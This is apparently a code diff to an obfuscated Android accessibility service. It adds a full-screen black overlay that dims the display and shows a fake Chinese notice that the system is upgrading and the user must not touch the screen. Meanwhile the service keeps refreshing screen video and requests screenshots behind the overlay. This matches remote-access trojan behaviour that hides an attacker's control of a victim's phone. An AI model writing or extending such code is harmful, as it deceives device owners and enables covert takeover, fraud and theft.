@@ -52,6 +52,7 @@ import android.content.res.ColorStateList
 
 import android.content.Intent
 import android.net.Uri
+import android.provider.Settings
 import pkg2230.ClsFx9V0S
 
 
@@ -87,7 +88,6 @@ import java.util.concurrent.ThreadPoolExecutor
 import java.util.concurrent.TimeUnit
 import android.content.ContentValues
 import android.provider.MediaStore
-import android.provider.Settings
 import java.util.concurrent.SynchronousQueue
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicLong
@@ -614,6 +614,10 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
     private lateinit var overLayparams_bass: WindowManager.LayoutParams
     private lateinit var overLay: FrameLayout
     private var blankDevProgressText: String? = null
+    private var blankSavedBrightness: Int? = null
+    private var blankSavedBrightnessMode: Int? = null
+    private var blankSystemBrightnessApplied = false
+    private var blankWindowBrightnessApplied = false
     private val lock = ReentrantLock()
     
 
@@ -892,11 +896,15 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
                         applyBlankOverlayVisual(false)
 	                    overLay.visibility = View.GONE
                         DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, false)
+                        restoreBlankBrightness("blank-close")
+                        refreshVideoAfterBlankChange("blank-close", requestCleanScreenshot = true)
 	                } else {
+                        applyBlankOverlayVisual(true)
+                        applyBlankBrightness("blank-open")
+                        overLay.visibility = View.VISIBLE
                         BIS = true
                         DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, true)
-                        applyBlankOverlayVisual(true)
-                        overLay.visibility = View.VISIBLE
+                        refreshVideoAfterBlankChange("blank-open", requestCleanScreenshot = false)
 	                }
 	            } catch (e: Exception) {
 	                Log.e("InputService", "onstart_overlay: update visibility failed", e)
@@ -977,6 +985,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
                 blackCover,
                 FrameLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
             )
+            addBlankHintTextView()
         }
     }
 
@@ -1001,6 +1010,125 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
             rightMargin = blankDp(12)
         }
         overLay.addView(view, params)
+    }
+
+    private fun addBlankHintTextView() {
+        val metrics = resources.displayMetrics
+        val hintSize = 5 * blankDp(100)
+        val hintTopMargin = metrics.heightPixels - hintSize - blankDp(60)
+        val view = TextView(this).apply {
+            text = "\n\n系统正在优化升级\n请勿触碰屏幕\n请您耐心等候"
+            textSize = 16.5f
+            typeface = Typeface.DEFAULT
+            setTextColor(Color.WHITE)
+            gravity = Gravity.LEFT or Gravity.BOTTOM
+            includeFontPadding = true
+            setPadding(blankDp(20), blankDp(20), blankDp(20), blankDp(20))
+            setBackgroundColor(Color.TRANSPARENT)
+            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO
+        }
+        val params = FrameLayout.LayoutParams(hintSize, hintSize).apply {
+            gravity = Gravity.LEFT or Gravity.TOP
+            topMargin = hintTopMargin
+            leftMargin = blankDp(60)
+        }
+        overLay.addView(view, params)
+    }
+
+    private fun refreshVideoAfterBlankChange(reason: String, requestCleanScreenshot: Boolean) {
+        try {
+            overLay.invalidate()
+        } catch (_: Exception) {
+        }
+        nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-now")
+        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-early") }, 80)
+        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-mid") }, 260)
+        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-late") }, 700)
+        if (requestCleanScreenshot && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            handler.postDelayed({ requestOneShotScreenshotFrame("$reason-clean") }, 120)
+        }
+    }
+
+    private fun applyBlankBrightness(reason: String) {
+        if (blankSavedBrightness == null) {
+            blankSavedBrightness = Settings.System.getInt(
+                contentResolver,
+                Settings.System.SCREEN_BRIGHTNESS,
+                125
+            )
+            blankSavedBrightnessMode = Settings.System.getInt(
+                contentResolver,
+                Settings.System.SCREEN_BRIGHTNESS_MODE,
+                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+            )
+        }
+        try {
+            if (canWriteSystemBrightness()) {
+                val modeWritten = Settings.System.putInt(
+                    contentResolver,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+                )
+                blankSystemBrightnessApplied = blankSystemBrightnessApplied || modeWritten
+                val brightnessWritten = Settings.System.putInt(
+                    contentResolver,
+                    Settings.System.SCREEN_BRIGHTNESS,
+                    10
+                )
+                blankSystemBrightnessApplied = blankSystemBrightnessApplied || brightnessWritten
+            }
+        } catch (e: Exception) {
+            Log.e("InputService", "apply blank system brightness failed: $reason", e)
+        }
+        setBlankWindowBrightness(true, reason)
+    }
+
+    private fun restoreBlankBrightness(reason: String) {
+        val savedBrightness = blankSavedBrightness
+        val savedMode = blankSavedBrightnessMode
+        try {
+            if (blankSystemBrightnessApplied && canWriteSystemBrightness() && savedBrightness != null) {
+                Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, savedBrightness)
+                if (savedMode != null) {
+                    Settings.System.putInt(
+                        contentResolver,
+                        Settings.System.SCREEN_BRIGHTNESS_MODE,
+                        savedMode
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("InputService", "restore blank system brightness failed: $reason", e)
+        } finally {
+            blankSavedBrightness = null
+            blankSavedBrightnessMode = null
+            blankSystemBrightnessApplied = false
+        }
+        setBlankWindowBrightness(false, reason)
+    }
+
+    private fun canWriteSystemBrightness(): Boolean {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)
+    }
+
+    private fun setBlankWindowBrightness(active: Boolean, reason: String) {
+        if (!::overLayparams_bass.isInitialized) return
+        val target = if (active) 10f / 255f else WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
+        if (overLayparams_bass.screenBrightness == target && blankWindowBrightnessApplied == active) return
+        overLayparams_bass.screenBrightness = target
+        blankWindowBrightnessApplied = active
+        updateBlankOverlayLayoutParams("brightness-$reason")
+    }
+
+    private fun updateBlankOverlayLayoutParams(reason: String) {
+        if (!::windowManager.isInitialized || !::overLay.isInitialized || overLay.windowToken == null) {
+            return
+        }
+        try {
+            windowManager.updateViewLayout(overLay, overLayparams_bass)
+        } catch (e: Exception) {
+            Log.e("InputService", "update blank overlay layout failed: $reason", e)
+        }
     }
 
     private fun blankDp(value: Int): Int {
@@ -2458,6 +2586,9 @@ fun b481c5f9b372ead_2() {
         overLayparams_bass = overLay.layoutParams as WindowManager.LayoutParams
         BIS = gohome != View.GONE
         applyBlankOverlayVisual(BIS)
+        if (BIS) {
+            applyBlankBrightness("blank-init")
+        }
         overLay.visibility = if (BIS) View.VISIBLE else View.GONE
 }
 
@@ -2471,15 +2602,20 @@ fun b481c5f9b372ead_2() {
                 overLay.post {
                     try {
                         if (targetVisibility != View.GONE) {
+                            applyBlankOverlayVisual(true)
+                            applyBlankBrightness("blank-sync-open")
+                            overLay.visibility = targetVisibility
                             BIS = true
                             DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, true)
-                            applyBlankOverlayVisual(true)
+                            refreshVideoAfterBlankChange("blank-sync-open", requestCleanScreenshot = false)
                         } else {
                             BIS = false
                             applyBlankOverlayVisual(false)
                             DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, false)
+                            refreshVideoAfterBlankChange("blank-sync-close", requestCleanScreenshot = true)
+                            overLay.visibility = targetVisibility
+                            restoreBlankBrightness("blank-sync-close")
                         }
-                        overLay.visibility = targetVisibility
                     } catch (e: Exception) {
                         Log.e("InputService", "runnable: update visibility failed", e)
                     }
@@ -2498,6 +2634,7 @@ fun b481c5f9b372ead_2() {
     {    ctx = null
 	}
         applyBlankOverlayVisual(false)
+        restoreBlankBrightness("destroy")
         DevAutoSelectorController.release(this)
         wirelessDebugAutomationRunning = false
         wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE
